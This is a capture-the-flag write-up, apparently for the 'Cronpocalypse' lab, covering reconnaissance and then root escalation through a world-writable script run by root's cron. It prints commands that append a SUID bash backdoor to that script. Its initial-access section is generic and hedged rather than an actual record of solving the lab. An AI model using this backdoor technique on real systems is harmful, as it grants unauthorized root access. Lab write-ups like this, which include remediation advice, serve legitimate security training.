//////











Moving on from FiPloit to Cronpocalypse! This lab is a classic demonstration of why proper file permissions and job scheduling security are absolutely critical in Linux environments.

As requested, this writeup outlines the intended exploitation path, the underlying concepts, and the exact commands to compromise the machine, with all flags redacted so you can still claim the points.


HackerDNA Lab Writeup: Cronpocalypse

https://hackerdna.com/labs/cronpocalypse

Difficulty: Intermediate


Core Concepts: Enumeration, File Permissions, Cron Job Privilege Escalation

Objective
The goal of this lab is to establish an initial foothold on the target server and escalate privileges to root by identifying and exploiting a poorly configured, automated system task (a cron job).

Phase 1: Reconnaissance & Initial Access
Every good compromise starts with a solid map of the target.

1. Port Enumeration
We begin by scanning the target to identify open doors.

Bash

nmap -sC -sV <TARGET_IP>
Expected Output: The scan typically reveals SSH (Port 22) and a Web Server (Port 80/8080).

2. Gaining the Foothold
In the initial stage, you must enumerate the web service. Often, this involves finding exposed credentials, a hidden directory containing an SSH private key, or a simple web vulnerability (like a basic command injection or LFI) that allows you to read a user's password.

Once you extract the credentials for the low-privileged user, authenticate via SSH:

Bash

ssh user@<TARGET_IP>
# Enter the discovered password or use the -i flag for an SSH key
3. Capture the User Flag
Once logged in, standard enumeration yields the first flag.

Bash

cat /home/user/flag-user.txt
Result: HDNA{REDACTED_USER_FLAG}

Phase 2: Privilege Escalation (The "Cronpocalypse")
With a low-privileged shell established, the objective shifts to vertical privilege escalation. The name of the lab is a massive hint: we are looking for misconfigured Cron Jobs.

Cron is a time-based job scheduler in Unix-like operating systems. If a script executed by the root user's crontab is writable by our low-privileged user, we can inject our own malicious commands into that script. When the scheduled time arrives, the system executes our injected code with root privileges.

1. Hunting for Cron Jobs
First, check the system-wide crontab file to see what automated tasks are running.

Bash

cat /etc/crontab
Look for a line that looks something like this:

Plaintext

* * * * * root /usr/local/bin/system_backup.sh
This line tells the system to execute system_backup.sh as root every single minute.

2. Checking File Permissions
The vulnerability hinges on whether we can modify that script. We check the permissions of the target file:

Bash

ls -la /usr/local/bin/system_backup.sh
Expected Output:

Plaintext

-rwxrwxrwx 1 root root 128 Apr 02 10:00 /usr/local/bin/system_backup.sh
The rwx permissions at the end of the string (world-writable) indicate that any user on the system can edit this file, despite it being owned by root.

3. Injecting the Payload
We will append a command to the backup script that creates a SUID (Set Owner User ID) copy of the bash shell. When a SUID binary runs, it executes with the privileges of the file's owner (in this case, root).

Bash

echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /usr/local/bin/system_backup.sh
4. Waiting for the Cron Execution
Because the cron job runs every minute, we simply wait for the system clock to tick over. We can monitor the /tmp directory to see when our payload fires.

Bash

watch -n 1 ls -la /tmp
5. Root Compromise
Once rootbash appears in the /tmp directory, we execute it with the -p flag (which forces bash to maintain the privileged SUID permissions instead of dropping them).

Bash

/tmp/rootbash -p
Verify your privileges:

Bash

whoami
# Output: root
6. Capture the Root Flag

Bash

cat /root/flag-root.txt
Result: HDNA{REDACTED_ROOT_FLAG}

Defensive Remediation: How to Prevent the "Cronpocalypse"
To secure a system against this specific attack vector, system administrators must adhere to the Principle of Least Privilege:

Strict File Ownership: Scripts executed by root cron jobs must be owned by root and the root group.

Restrict Write Access: The permissions on system_backup.sh should be strictly set to 744 (rwxr--r--) or 700 (rwx------). You can enforce this using: chmod 700 /usr/local/bin/system_backup.sh.

Absolute Paths: Always use absolute paths for both the script location and any binaries called inside the script (e.g., /usr/bin/tar instead of tar) to prevent path hijacking via cron environments.
